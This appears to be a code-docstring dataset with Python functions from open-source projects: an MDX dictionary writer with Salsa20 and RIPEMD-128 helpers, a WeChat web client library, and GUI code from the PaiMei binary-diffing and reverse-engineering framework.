{"docstring": "# Builds the data for offset_table.\n#\n# offset_table is a iterable containing _OffsetTableEntry objects.\n#\n# Only uses the key, key_len, key_null and offset fields, and effectively ignores record_null.\n\n", "func_signal": "def __init__(self, offset_table, compression_type, version):\n", "code": "_MdxBlock.__init__(self, offset_table, compression_type, version)\nself._num_entries = len(offset_table)\nif version==\"2.0\":\n\tself._first_key = offset_table[0].key_null\n\tself._last_key = offset_table[len(offset_table)-1].key_null\nelse:\n\tself._first_key = offset_table[0].key\n\tself._last_key = offset_table[len(offset_table)-1].key\nself._first_key_len = offset_table[0].key_len\nself._last_key_len = offset_table[len(offset_table)-1].key_len", "path": "writemdict.py", "repo_name": "zhansliu/writemdict", "stars": 288, "license": "mit", "language": "python", "size": 47}
{"docstring": "\"\"\" \\\nDefine and return a testing version of pySalsa20's Salsa20 class.\n\"\"\"\n\n", "func_signal": "def patch_pySalsa20():\n", "code": "class Testing_pysalsa20( pySalsa20.Salsa20 ):\n\n    def salsa20core( self, input, nRounds ):\n        \"\"\" Do nRounds Salsa20 rounds on input, a 64-byte string.\n            Returns a 64-byte string.  SETS ROUNDS GLOBAL IN LIBSALSA20.\n            \"\"\"\n        try:\n            libSalsa20.set_rounds( nRounds )\n        except:\n            msg  = '*** Your libsalsa20 does not support the '  \\\n                 + 'set_rounds() function; some tests will fail ' \\\n                 + 'because of this.'\n            print(msg)\n\n        assert type( input ) == bytes, 'input must be byte string'\n        assert len( input ) == 64, 'input must be 64-byte string'\n\n        NUL_message = c_buffer( 64 ) # to be xored with hash output\n        output = c_buffer( 64 )\n        # Interpret each four input bytes as a little-endian word,\n        # then repack as native-order words for the C routine:\n        ctx = native16_i32.pack( *little16_i32.unpack( input ) )\n        libSalsa20.ECRYPT_encrypt_bytes( ctx, NUL_message, output, 64 )\n        return output.raw[:64]\n\n\n    def force_nRounds( self, nRounds ):\n        \"\"\" \\\n        Set # of rounds bypassing the \"in [8,12,20]\" check, for testing.\n        \"\"\"\n        libSalsa20.set_rounds( nRounds )\n\n\n# Return the class:\nreturn Testing_pysalsa20", "path": "testSalsa20.py", "repo_name": "zhansliu/writemdict", "stars": 288, "license": "mit", "language": "python", "size": 47}
{"docstring": "# Returns a bytes object, containing the header data for this block\n", "func_signal": "def get_index_entry(self):\n", "code": "if self._version == \"2.0\":\n\tlong_format = b\">Q\"\n\tshort_format = b\">H\"\nelse:\n\tlong_format = b\">L\"\n\tshort_format = b\">B\"\nreturn (\n    struct.pack(long_format, self._num_entries)\n  + struct.pack(short_format, self._first_key_len)\n  + self._first_key\n  + struct.pack(short_format, self._last_key_len)\n  + self._last_key\n  + struct.pack(long_format, self._comp_size)\n  + struct.pack(long_format, self._decomp_size)\n  )", "path": "writemdict.py", "repo_name": "zhansliu/writemdict", "stars": 288, "license": "mit", "language": "python", "size": 47}
{"docstring": "\"\"\" \\\nImport the named salsa20 module(s), plus related stuff used for testing.\nTolerates errors but for any failure leaves salsa20_modules[name] = None.\n\"\"\"\n", "func_signal": "def import_salsa( module_names, verbose=False ):\n", "code": "for name in module_names:\n    if name == \"pureSalsa20\":\n        try:\n            global pureSalsa20\n            import pureSalsa20\n            salsa20_test_classes[name] = patch_pureSalsa20()\n            salsa20_modules[name] = pureSalsa20\n        except:\n            if verbose: print(\"Problem importing pureSalsa20\")\n    elif name == \"pySalsa20\":\n        try:\n            global pySalsa20\n            import pySalsa20\n            global libSalsa20\n            libSalsa20 = pySalsa20.loadLib('salsa20')\n            salsa20_test_classes[name] = patch_pySalsa20()\n            salsa20_modules[name] = pySalsa20\n        except:\n            if verbose:\n                print(\"Problem importing pySalsa20\", end=\" \")\n                print(\"or loading libsalsa20.so or salsa20.lib\")\n    else:\n        if verbose:\n            print(\"Don't know how to import\", repr(n), \"module.\")", "path": "testSalsa20.py", "repo_name": "zhansliu/writemdict", "stars": 288, "license": "mit", "language": "python", "size": 47}
{"docstring": "# Split either the records or the keys into blocks for compression.\n# \n# Returns a list of _MdxBlock, where the decompressed size of each block is (as\n# far as practicable) less than self._block_size.\n#\n# block_type should be a subclass of _MdxBlock, i.e. either _MdxRecordBlock or \n# _MdxKeyBlock.\n\n", "func_signal": "def _split_blocks(self, block_type):\n", "code": "this_block_start = 0\ncur_size = 0\nblocks = []\nfor ind in range(len(self._offset_table)+1):\n\tif ind != len(self._offset_table):\n\t\tt = self._offset_table[ind]\n\telse:\n\t\tt = None\n\t\n\tif ind == 0:\n\t\tflush = False \n\t\t# nothing to flush yet\n\t\t# this part is needed in case the first entry is longer than\n\t\t# self._block_size.\n\telif ind == len(self._offset_table):\n\t\tflush = True #always flush the last block\n\telif cur_size + block_type._len_block_entry(t) > self._block_size:\n\t\tflush = True #Adding this entry to make us larger than\n\t\t             #self._block_size, so flush now.\n\telse:\n\t\tflush = False\n\tif flush:\n\t\tblocks.append(block_type(\n\t\t    self._offset_table[this_block_start:ind], self._compression_type, self._version))\n\t\tcur_size = 0\n\t\tthis_block_start = ind\n\tif t is not None: #mentally add this entry to list of things \n\t\tcur_size += block_type._len_block_entry(t)\nreturn blocks", "path": "writemdict.py", "repo_name": "zhansliu/writemdict", "stars": 288, "license": "mit", "language": "python", "size": 47}
{"docstring": "\"\"\"\nreturns a two-dimensional array X[i][j] of 32-bit integers, where j ranges\nfrom 0 to 16.\nFirst pads the message to length in bytes is congruent to 56 (mod 64), \nby first adding a byte 0x80, and then padding with 0x00 bytes until the\nmessage length is congruent to 56 (mod 64). Then adds the little-endian\n64-bit representation of the original length. Finally, splits the result\nup into 64-byte blocks, which are further parsed as 32-bit integers.\n\"\"\"\n", "func_signal": "def padandsplit(message):\n", "code": "origlen = len(message)\npadlength = 64 - ((origlen - 56) % 64) #minimum padding is 1!\nmessage += b\"\\x80\"\nmessage += b\"\\x00\" * (padlength - 1)\nmessage += struct.pack(\"<Q\", origlen*8)\nassert(len(message) % 64 == 0)\nreturn [\n         [\n           struct.unpack(\"<L\", message[i+j:i+j+4])[0]\n           for j in range(0, 64, 4)\n         ]\n         for i in range(0, len(message), 64)\n       ]", "path": "ripemd128.py", "repo_name": "zhansliu/writemdict", "stars": 288, "license": "mit", "language": "python", "size": 47}
{"docstring": "\"\"\" \\\nA simpler, slower rot32 to test the tester and compare speeds.\nThis creates longs temporarily, but returns an int.\nFor comparison with rot32().  It's about half as fast.\n\"\"\"\n", "func_signal": "def rot32long( w, nLeft ):\n", "code": "w &= 0xffffFFFF\nnLeft &= 31  # which makes nLeft >= 0\nw = ( w << nLeft ) | ( w >> ( 32 - nLeft ) )\nreturn int( ( w & 0x7fffFFFF ) | ( - ( w & 0x80000000 ) ) )", "path": "testSalsa20.py", "repo_name": "zhansliu/writemdict", "stars": 288, "license": "mit", "language": "python", "size": 47}
{"docstring": "\"\"\" \nWrite the mdx file to outfile.\n\noutfile: a file-like object, opened in binary mode.\n\"\"\"\n\n", "func_signal": "def write(self, outfile):\n", "code": "self._write_header(outfile)\nself._write_key_sect(outfile)\nself._write_record_sect(outfile)", "path": "writemdict.py", "repo_name": "zhansliu/writemdict", "stars": 288, "license": "mit", "language": "python", "size": 47}
{"docstring": "# Returns a hexadecimal representation of bytes_blob, as a (unicode) string.\n#\n# bytes_blob should have type bytes.\n\n# In Python 2.6+, bytes is an alias for str, and indexing into a bytes\n# object gives a string of length 1.\n# In Python 3, indexing into a bytes object gives a number.\n# The following should work on both versions.\n", "func_signal": "def _hexdump(bytes_blob):\n", "code": "if bytes == str:\n\treturn \"\".join(\"{:02X}\".format(ord(c)) for c in bytes_blob)\nelse:\n\treturn \"\".join(\"{:02X}\".format(c) for c in bytes_blob)", "path": "writemdict.py", "repo_name": "zhansliu/writemdict", "stars": 288, "license": "mit", "language": "python", "size": 47}
{"docstring": "\"\"\" Add two 32-bit words discarding carry above 32nd bit,\n    and without creating a Python long.\n    Timing shouldn't vary.\n\"\"\"\n", "func_signal": "def add32( a, b ):\n", "code": "lo = ( a & 0xFFFF ) + ( b & 0xFFFF )\nhi = ( a >> 16 ) + ( b >> 16 ) + ( lo >> 16 )\nreturn ( -(hi & 0x8000) | ( hi & 0x7FFF ) ) << 16 | ( lo & 0xFFFF )", "path": "pureSalsa20.py", "repo_name": "zhansliu/writemdict", "stars": 288, "license": "mit", "language": "python", "size": 47}
{"docstring": "\"\"\" Rotate 32-bit word left by nLeft or right by -nLeft\n    without creating a Python long.\n    Timing depends on nLeft but not on w.\n\"\"\"\n", "func_signal": "def rot32( w, nLeft ):\n", "code": "nLeft &= 31  # which makes nLeft >= 0\nif nLeft == 0:\n    return w\n\n# Note: now 1 <= nLeft <= 31.\n#     RRRsLLLLLL   There are nLeft RRR's, (31-nLeft) LLLLLL's,\n# =>  sLLLLLLRRR   and one s which becomes the sign bit.\nRRR = ( ( ( w >> 1 ) & 0x7fffFFFF ) >> ( 31 - nLeft ) )\nsLLLLLL = -( (1<<(31-nLeft)) & w ) | (0x7fffFFFF>>nLeft) & w\nreturn RRR | ( sLLLLLL << nLeft )", "path": "pureSalsa20.py", "repo_name": "zhansliu/writemdict", "stars": 288, "license": "mit", "language": "python", "size": 47}
{"docstring": "\"\"\" Return the bottom 32 bits of w as a Python int.\n    This may create a long temporarily, but returns an int. \"\"\"\n", "func_signal": "def trunc32( w ):\n", "code": "w = int( ( w & 0x7fffFFFF ) | ( - ( w & 0x80000000 ) ) )\nassert type(w) == int\nreturn w", "path": "testSalsa20.py", "repo_name": "zhansliu/writemdict", "stars": 288, "license": "mit", "language": "python", "size": 47}
{"docstring": "\"\"\"Batch getting contact.\"\"\"\n", "func_signal": "def get_batch_contact(self, user_list):\n", "code": "contact_res = self._api_cls.mget_contact_list(self.session, user_list)\nreturn contact_res['ContactList']", "path": "pywxclient\\core\\client.py", "repo_name": "justdoit0823/pywxclient", "stars": 276, "license": "apache-2.0", "language": "python", "size": 58}
{"docstring": "\"\"\"Return wechat session endpoint.\"\"\"\n", "func_signal": "def wx_endpoint(self):\n", "code": "if not self._wx_endpoint:\n    self._wx_endpoint = WeChatAPI.get_wx_endpoint()\n\nreturn self._wx_endpoint", "path": "pywxclient\\core\\session.py", "repo_name": "justdoit0823/pywxclient", "stars": 276, "license": "apache-2.0", "language": "python", "size": 58}
{"docstring": "\"\"\"Initialize client with Session object and api class.\"\"\"\n", "func_signal": "def __init__(self, session, api_cls=WeChatAPI):\n", "code": "self.session = session\nself.user = None\nself.userAvatar = None\nself._uuid = None\nself._login_uri = None\nself._api_cls = api_cls", "path": "pywxclient\\core\\client.py", "repo_name": "justdoit0823/pywxclient", "stars": 276, "license": "apache-2.0", "language": "python", "size": 58}
{"docstring": "\"\"\"Dump client object as dict.\"\"\"\n", "func_signal": "def dump(self):\n", "code": "return {\n    'session': self.session.dump(), 'user': self.user,\n    'uuid': self._uuid}", "path": "pywxclient\\core\\client.py", "repo_name": "justdoit0823/pywxclient", "stars": 276, "license": "apache-2.0", "language": "python", "size": 58}
{"docstring": "\"\"\"Close client.\"\"\"\n", "func_signal": "def close(self):\n", "code": "self.session.close()\nself.session = None\nself.userAvatar = None\nself._uuid = None\nself._login_uri = None\nself.user = None\nself._sync_key = None", "path": "pywxclient\\core\\client.py", "repo_name": "justdoit0823/pywxclient", "stars": 276, "license": "apache-2.0", "language": "python", "size": 58}
{"docstring": "\"\"\"Get user WeChat contact.\"\"\"\n", "func_signal": "def build_contact(client):\n", "code": "contacts = client.get_contact()\nfor user in contacts:\n    _client_contacts[user['UserName']] = user\n\n_client_contacts[client.user['UserName']] = client.user", "path": "examples\\thread_client.py", "repo_name": "justdoit0823/pywxclient", "stars": 276, "license": "apache-2.0", "language": "python", "size": 58}
{"docstring": "\"\"\"Sync session state.\"\"\"\n", "func_signal": "def sync(self, sync_key):\n", "code": "self._wx_session.sync_session_key(sync_key)\nself._online = self._online or True", "path": "pywxclient\\core\\session.py", "repo_name": "justdoit0823/pywxclient", "stars": 276, "license": "apache-2.0", "language": "python", "size": 58}
{"docstring": "\"\"\"Login wechat session.\"\"\"\n", "func_signal": "def login(self):\n", "code": "if self.session.is_active():\n    # already login\n    return\n\npage_info = self._api_cls.new_login_page(self.session, self._login_uri)\nself.session.initialize_wx_session(page_info)\n\ninit_res = self._api_cls.wx_init(self.session)\nself.user = init_res['User']\n\nself.session.sync(init_res['SyncKey'])", "path": "pywxclient\\core\\client.py", "repo_name": "justdoit0823/pywxclient", "stars": 276, "license": "apache-2.0", "language": "python", "size": 58}
{"docstring": "\"\"\"Sync wechat session.\"\"\"\n", "func_signal": "def sync_session(client, input_queue, login_event, exit_event):\n", "code": "client_log = getLogger('client')\nauthorize_url = client.open_authorize_url()\n\nauthorization_prompt = 'Authorization url: {}'.format(authorize_url)\nclient_log.info(authorization_prompt)\n\nwhile True:\n    try:\n        authorize_success = client.authorize()\n    except WaitScanQRCode:\n        continue\n\n    if authorize_success:\n        break\n\n    client_log.info('Waiting for authorize...')\n    time.sleep(2)\n\nclient.login()\nbuild_contact(client)\nclient_log.debug('Login success...')\nlogin_event.set()\n\nwhile True:\n    try:\n        sync_ret = client.sync_check()\n        if sync_ret != 0:\n            msgs = client.sync_message()\n            for msg in msgs['AddMsgList']:\n                try:\n                    msg_obj = parse_message(msg)\n                except UnsupportedMessage:\n                    client_log.info('unsupported message %s', msg)\n                    continue\n                else:\n                    if msg_obj.message:\n                        input_queue.put(msg_obj)\n\n            client.flush_sync_key()\n    except (RequestError, APIResponseError):\n        client_log.info('api error.')\n    except SessionExpiredError:\n        client_log.error('wechat session is expired....')\n        exit_event.set()\n        break\n    except Exception:\n        continue", "path": "examples\\thread_client.py", "repo_name": "justdoit0823/pywxclient", "stars": 276, "license": "apache-2.0", "language": "python", "size": 58}
{"docstring": "\"\"\"Load session from data.\"\"\"\n", "func_signal": "def load(self, session_data):\n", "code": "wx_session_data = session_data['wx_session']\nif wx_session_data:\n    self._wx_session = WxSession.from_dict(wx_session_data)\n    self._authorized = True\n    self._online = True\n\nself._req_session.load(session_data['req_session'])\nself._wx_endpoint = session_data.get('wx_endpoint')", "path": "pywxclient\\core\\session.py", "repo_name": "justdoit0823/pywxclient", "stars": 276, "license": "apache-2.0", "language": "python", "size": 58}
{"docstring": "\"\"\"Open WeChat authorization url in system-default browser.\"\"\"\n", "func_signal": "def open_authorize_url(self):\n", "code": "authorize_url = self.get_authorize_url()\nwebbrowser.open(authorize_url)\nreturn authorize_url    # allow for url passthrough", "path": "pywxclient\\core\\client.py", "repo_name": "justdoit0823/pywxclient", "stars": 276, "license": "apache-2.0", "language": "python", "size": 58}
{"docstring": "\"\"\"Show input message thread.\"\"\"\n", "func_signal": "def show_input_message(client, input_queue, msg_queue, exit_event):\n", "code": "while not exit_event.is_set():\n    try:\n        msg_obj = input_queue.get(timeout=5)\n    except queue.Empty:\n        continue\n    else:\n        from_user = msg_obj.from_user\n        user_info = get_user(from_user)\n        show_username = user_info['RemarkName'] or user_info[\n            'NickName'] if user_info else from_user\n        print('{0}: {1}'.format(show_username, msg_obj.message))\n        if from_user == client.user['UserName']:\n            print('continue:', end=' ', flush=True)\n            reply_msg = sys.stdin.readline()\n            if reply_msg and reply_msg != '\\n':\n                msg_queue.put((reply_msg, msg_obj.to_user))\n        else:\n            print('reply:', end=' ', flush=True)\n            reply_msg = sys.stdin.readline()\n            if reply_msg and reply_msg != '\\n':\n                msg_queue.put((reply_msg, from_user))", "path": "examples\\thread_client.py", "repo_name": "justdoit0823/pywxclient", "stars": 276, "license": "apache-2.0", "language": "python", "size": 58}
{"docstring": "\"\"\"Return session data.\"\"\"\n", "func_signal": "def to_dict(self):\n", "code": "return {\n    'skey': self._skey, 'pass_ticket': self._pass_ticket,\n    'wxsid': self._wxsid, 'wxuin': self._wxuin,\n    'isgrayscale': self._isgrayscale, 'sync_key': self._sync_key}", "path": "pywxclient\\core\\session.py", "repo_name": "justdoit0823/pywxclient", "stars": 276, "license": "apache-2.0", "language": "python", "size": 58}
{"docstring": "\"\"\"Upload resource to WeChat.\"\"\"\n", "func_signal": "def upload(self, file_obj, to_username):\n", "code": "return self._api_cls.upload_file(\n    self.session, file_obj, self.user['UserName'], to_username)", "path": "pywxclient\\core\\client.py", "repo_name": "justdoit0823/pywxclient", "stars": 276, "license": "apache-2.0", "language": "python", "size": 58}
{"docstring": "\"\"\"Start wechat client.\"\"\"\n", "func_signal": "def run(**kwargs):\n", "code": "input_queue = queue.Queue()\nmsg_queue = queue.Queue()\nlogin_event = threading.Event()\nexit_event = threading.Event()\n\nconfig.dictConfig(LOGGING)\nclient_log = getLogger('client')\n\nsession = Session()\nclient = SyncClient(session)\nsession_thread = threading.Thread(\n    target=sync_session,\n    args=(client, input_queue, login_event, exit_event))\nreply_thread = threading.Thread(\n    target=reply_message,\n    args=(client, msg_queue, login_event, exit_event))\n\nsession_thread.start()\nreply_thread.start()\n\nshow_input_message(client, input_queue, msg_queue, exit_event)\n\nsession_thread.join()\nreply_thread.join()\n\nclient_log.info('process down...')", "path": "examples\\thread_client.py", "repo_name": "justdoit0823/pywxclient", "stars": 276, "license": "apache-2.0", "language": "python", "size": 58}
{"docstring": "\"\"\"Check session status.\"\"\"\n", "func_signal": "def sync_check(self):\n", "code": "check_res = self._api_cls.check_sync(self.session)\nreturn int(check_res['selector'])", "path": "pywxclient\\core\\client.py", "repo_name": "justdoit0823/pywxclient", "stars": 276, "license": "apache-2.0", "language": "python", "size": 58}
{"docstring": "\"\"\"Sync wechat message.\"\"\"\n", "func_signal": "def sync_message(self):\n", "code": "message = self._api_cls.do_sync(self.session)\n\nsync_key = message['SyncKey']\nself._sync_key = sync_key\n\nreturn message", "path": "pywxclient\\core\\client.py", "repo_name": "justdoit0823/pywxclient", "stars": 276, "license": "apache-2.0", "language": "python", "size": 58}
{"docstring": "\"\"\"Initialize a WxSession from dict.\"\"\"\n", "func_signal": "def from_dict(cls, session_data):\n", "code": "skey = session_data['skey']\npass_ticket = session_data['pass_ticket']\nwxsid = session_data['wxsid']\nwxuin = session_data['wxuin']\nisgrayscale = session_data['isgrayscale']\nsync_key = session_data.get('sync_key')\n\nwx_session = cls(\n    skey, pass_ticket, wxsid, wxuin, isgrayscale=isgrayscale)\n\nif sync_key:\n    wx_session.sync_session_key(copy.copy(sync_key))\n\nreturn wx_session", "path": "pywxclient\\core\\session.py", "repo_name": "justdoit0823/pywxclient", "stars": 276, "license": "apache-2.0", "language": "python", "size": 58}
{"docstring": "\"\"\"Get wechat contact.\"\"\"\n", "func_signal": "def get_contact(self):\n", "code": "contact_res = self._api_cls.get_contact_list(self.session)\nreturn contact_res['MemberList']", "path": "pywxclient\\core\\client.py", "repo_name": "justdoit0823/pywxclient", "stars": 276, "license": "apache-2.0", "language": "python", "size": 58}
{"docstring": "\"\"\"Initialize WeChat session.\"\"\"\n", "func_signal": "def __init__(self, skey, pass_ticket, wxsid, wxuin, isgrayscale=0):\n", "code": "self._skey = skey\nself._pass_ticket = pass_ticket\nself._wxsid = wxsid\nself._wxuin = wxuin\nself._isgrayscale = isgrayscale\nself._sync_key = {}", "path": "pywxclient\\core\\session.py", "repo_name": "justdoit0823/pywxclient", "stars": 276, "license": "apache-2.0", "language": "python", "size": 58}
{"docstring": "'''\nDisplay the matched/diffed functions dialog box\n'''\n", "func_signal": "def view_match_diff_functions(self, event):\n", "code": "dlg = FunctionViewDifferDlg.FunctionViewDifferDlg(parent=self.top)\ndlg.ShowModal()", "path": "console\\modules\\_PAIMEIdiff\\MatchedListCtrl.py", "repo_name": "OpenRCE/paimei", "stars": 485, "license": "gpl-2.0", "language": "python", "size": 3286}
{"docstring": "# begin wxGlade: PAIMEIexplorer.__do_layout\n", "func_signal": "def __do_layout (self):\n", "code": "overall = wx.BoxSizer(wx.HORIZONTAL)\nlog_window_sizer = wx.BoxSizer(wx.HORIZONTAL)\ncolumns = wx.BoxSizer(wx.HORIZONTAL)\nspecial_column = wx.StaticBoxSizer(self.special_column_staticbox, wx.VERTICAL)\ndisassmbly_column = wx.StaticBoxSizer(self.disassmbly_column_staticbox, wx.VERTICAL)\nbrowser_column = wx.StaticBoxSizer(self.browser_column_staticbox, wx.VERTICAL)\nbrowser_column.Add(self.pida_modules_static, 0, wx.ADJUST_MINSIZE, 0)\nbrowser_column.Add(self.pida_modules_list, 1, wx.EXPAND, 0)\nbrowser_column.Add(self.add_module, 0, wx.EXPAND|wx.ADJUST_MINSIZE, 0)\nbrowser_column.Add(self.explorer, 5, wx.EXPAND, 0)\ncolumns.Add(browser_column, 1, wx.EXPAND, 0)\ndisassmbly_column.Add(self.disassembly, 1, wx.GROW, 0)\ncolumns.Add(disassmbly_column, 2, wx.EXPAND, 0)\nspecial_column.Add(self.special, 1, wx.EXPAND|wx.ADJUST_MINSIZE, 0)\ncolumns.Add(special_column, 1, wx.EXPAND, 0)\nself.top_window.SetAutoLayout(True)\nself.top_window.SetSizer(columns)\ncolumns.Fit(self.top_window)\ncolumns.SetSizeHints(self.top_window)\nlog_window_sizer.Add(self.log, 1, wx.EXPAND, 0)\nself.log_window.SetAutoLayout(True)\nself.log_window.SetSizer(log_window_sizer)\nlog_window_sizer.Fit(self.log_window)\nlog_window_sizer.SetSizeHints(self.log_window)\nself.log_splitter.SplitHorizontally(self.top_window, self.log_window)\noverall.Add(self.log_splitter, 1, wx.EXPAND, 0)\nself.SetAutoLayout(True)\nself.SetSizer(overall)\noverall.Fit(self)\noverall.SetSizeHints(self)\n# end wxGlade", "path": "console\\modules\\PAIMEIexplorer.py", "repo_name": "OpenRCE/paimei", "stars": 485, "license": "gpl-2.0", "language": "python", "size": 3286}
{"docstring": "'''\nRight click event handler for popup add remove module menu selection.\n'''\n\n", "func_signal": "def on_right_click_popup_remove_module (self, event):\n", "code": "if not self.selected:\n    return\n\nself.DeleteChildren(self.selected)\nself.Delete(self.selected)", "path": "console\\modules\\_PAIMEIexplorer\\ExplorerTreeCtrl.py", "repo_name": "OpenRCE/paimei", "stars": 485, "license": "gpl-2.0", "language": "python", "size": 3286}
{"docstring": "'''\nRemove the module from the TreeCtrl\n'''\n", "func_signal": "def remove_module (self):\n", "code": "if not self.root_module:\n    return\n    \nself.DeleteChildren(self.root_module)\nself.Delete(self.root_module)", "path": "console\\modules\\_PAIMEIdiff\\ExplorerTreeCtrl.py", "repo_name": "OpenRCE/paimei", "stars": 485, "license": "gpl-2.0", "language": "python", "size": 3286}
{"docstring": "'''\nLoad the specified module name from the pstalker module directly into the explorer tree control.\n\n@type  module_name: String\n@param module_name: Name of module to copy and load from pstalker module.\n'''\n\n", "func_signal": "def pida_copy (self, module_name):\n", "code": "other = self.main_frame.modules[\"pstalker\"].pida_modules\n\nif not other.has_key(module_name):\n    self.err(\"Specified module name %s, not found.\" % module_name)\n    return\n\nself.pida_modules[module_name] = other[module_name]\n\n# determine the function and basic block counts for this module.\nfunction_count    = len(self.pida_modules[module_name].nodes)\nbasic_block_count = 0\n\nfor function in self.pida_modules[module_name].nodes.values():\n    basic_block_count += len(function.nodes)\n\nidx = len(self.pida_modules) - 1\nself.pida_modules_list.InsertStringItem(idx, \"\")\nself.pida_modules_list.SetStringItem(idx, 0, \"%d\" % function_count)\nself.pida_modules_list.SetStringItem(idx, 1, \"%d\" % basic_block_count)\nself.pida_modules_list.SetStringItem(idx, 2, module_name)", "path": "console\\modules\\PAIMEIexplorer.py", "repo_name": "OpenRCE/paimei", "stars": 485, "license": "gpl-2.0", "language": "python", "size": 3286}
{"docstring": "'''\nAdd a function the matched list box\n'''\n", "func_signal": "def add_function(self, func, idx):\n", "code": "if idx == -1:\n    idx = self.GetItemCount()\nidx = self.GetItemCount()\nself.InsertStringItem(idx, \"\")\nself.SetStringItem(idx, 0, \"%s\" % func.name)\nself.SetStringItem(idx, 1, \"0x%08x\" % func.ea_start)\nself.SetStringItem(idx, 2, \"0x%08x\" % func.ea_end)\nself.SetStringItem(idx, 3, \"%d\" % func.ext[\"PAIMEIDiffFunction\"].size)\nself.SetStringItem(idx, 4, \"%d\" % func.num_instructions)\nself.SetStringItem(idx, 5, \"%d\" % len(func.nodes))\nself.SetStringItem(idx, 6, \"%d\" % func.ext[\"PAIMEIDiffFunction\"].num_calls)\nself.SetStringItem(idx, 7, \"%d\" % 1)\nself.SetStringItem(idx, 8, \"%s\" % func.ext[\"PAIMEIDiffFunction\"].match_method)\n\nif \"SPP\" == func.ext[\"PAIMEIDiffFunction\"].match_method:\n    self.SetStringItem(idx, 9, \"0x%08x\" % func.ext[\"PAIMEIDiffFunction\"].spp)\nelif \"Smart MD5\" == func.ext[\"PAIMEIDiffFunction\"].match_method:\n    self.SetStringItem(idx, 9, \"%s\" % func.ext[\"PAIMEIDiffFunction\"].smart_md5)\nelif \"NECI\" == func.ext[\"PAIMEIDiffFunction\"].match_method:\n    self.SetStringItem(idx, 9, \"%d:%d:%d:%d\" % func.ext[\"PAIMEIDiffFunction\"].neci)\nelif \"Proximity\" == func.ext[\"PAIMEIDiffFunction\"].match_method:\n    self.SetStringItem(idx, 9, \"\")\nelif \"Name\" == func.ext[\"PAIMEIDiffFunction\"].match_method:\n    self.SetStringItem(idx, 9, \"%s\" % func.name)\nelif \"API Call\" == func.ext[\"PAIMEIDiffFunction\"].match_method:\n    call_str = \"\"\n    for call in func.ext[\"PAIMEIDiffFunction\"].refs_api:\n        (ea,s) = call\n        if call_str == \"\":\n            call_str += s\n        else:\n            call_str += \":\" + s\n    self.SetStringItem(idx, 9, \"%s\" % call_str)\nelif \"Constants\" == func.ext[\"PAIMEIDiffFunction\"].match_method:\n    const_str = \"\"\n    for const_s in func.ext[\"PAIMEIDiffFunction\"].refs_constants:\n        if const_str == \"\":\n            const_str += str(const_s)\n        else:\n            const_str += \":\" + str(const_s)\n    self.SetStringItem(idx, 9, \"%s\" % const_str)\nelif \"CRC\" == func.ext[\"PAIMEIDiffFunction\"].match_method:\n    self.SetStringItem(idx, 9, \"0x%08x\" % func.ext[\"PAIMEIDiffFunction\"].crc)\nelif \"Stack Frame\" == func.ext[\"PAIMEIDiffFunction\"].match_method:\n    self.SetStringItem(idx, 9, \"%d\" % func.frame_size)\nelif \"String References\" == func.ext[\"PAIMEIDiffFunction\"].match_method:\n    self.SetStringItem(idx, 9, \"\")\nelif \"Recursive Calls\" == func.ext[\"PAIMEIDiffFunction\"].match_method:\n    self.SetStringItem(idx, 9, \"\")\nelif \"Arg Var Size Count\" == func.ext[\"PAIMEIDiffFunction\"].match_method:\n    self.SetStringItem(idx, 9, \"%d:%d:%d:%d\" % (func.arg_size, func.num_args, func.local_var_size, func.num_local_vars )  )\nelif \"Call To Call From\" == func.ext[\"PAIMEIDiffFunction\"].match_method:\n    self.SetStringItem(idx, 9, \"\")\nelif \"Size\" == func.ext[\"PAIMEIDiffFunction\"].match_method:\n    self.SetStringItem(idx, 9, \"%d\" % func.ext[\"PAIMEIDiffFunction\"].size)\n\nself.itemDataMap[func.ea_start] = func.ea_start\nself.SetItemData(idx, func.ea_start)\n               \nif func.ext[\"PAIMEIDiffFunction\"].different:\n    item = self.GetItem(idx)\n    item.SetTextColour(wx.RED)\n    self.SetItem(item)\n    \n#self.function_list.append( func )", "path": "console\\modules\\_PAIMEIdiff\\MatchedListCtrl.py", "repo_name": "OpenRCE/paimei", "stars": 485, "license": "gpl-2.0", "language": "python", "size": 3286}
{"docstring": "# set the max length to whatever the widget supports (typically 32k).\n", "func_signal": "def __set_properties (self):\n", "code": "self.log.SetMaxLength(0)\n\n# begin wxGlade: PAIMEIexplorer.__set_properties\nself.SetFont(wx.Font(8, wx.DEFAULT, wx.NORMAL, wx.NORMAL, 0, \"MS Shell Dlg 2\"))\nself.pida_modules_static.SetFont(wx.Font(8, wx.DEFAULT, wx.NORMAL, wx.NORMAL, 0, \"MS Shell Dlg 2\"))\nself.pida_modules_list.SetFont(wx.Font(8, wx.DEFAULT, wx.NORMAL, wx.NORMAL, 0, \"MS Shell Dlg 2\"))\nself.add_module.SetFont(wx.Font(8, wx.DEFAULT, wx.NORMAL, wx.NORMAL, 0, \"MS Shell Dlg 2\"))\nself.explorer.SetFont(wx.Font(8, wx.DEFAULT, wx.NORMAL, wx.NORMAL, 0, \"MS Shell Dlg 2\"))\nself.special.SetFont(wx.Font(10, wx.MODERN, wx.NORMAL, wx.NORMAL, 0, \"Courier\"))\nself.log.SetFont(wx.Font(8, wx.MODERN, wx.NORMAL, wx.NORMAL, 0, \"Lucida Console\"))\nself.log_splitter.SetMinimumPaneSize(25)\n# end wxGlade", "path": "console\\modules\\PAIMEIexplorer.py", "repo_name": "OpenRCE/paimei", "stars": 485, "license": "gpl-2.0", "language": "python", "size": 3286}
{"docstring": "# begin wxGlade: PyDbgDialog.__set_properties\n", "func_signal": "def __set_properties(self):\n", "code": "self.SetTitle(\"Select Target\")\nself.SetSize((300, 500))\nself.retrieve_list.SetFont(wx.Font(8, wx.DEFAULT, wx.NORMAL, wx.NORMAL, 0, \"MS Shell Dlg 2\"))\nself.process_list.SetFont(wx.Font(8, wx.DEFAULT, wx.NORMAL, wx.NORMAL, 0, \"MS Shell Dlg 2\"))\nself.attach_or_load.SetFont(wx.Font(8, wx.DEFAULT, wx.NORMAL, wx.NORMAL, 0, \"MS Shell Dlg 2\"))\n# end wxGlade", "path": "console\\modules\\_PAIMEIpeek\\PyDbgDlg.py", "repo_name": "OpenRCE/paimei", "stars": 485, "license": "gpl-2.0", "language": "python", "size": 3286}
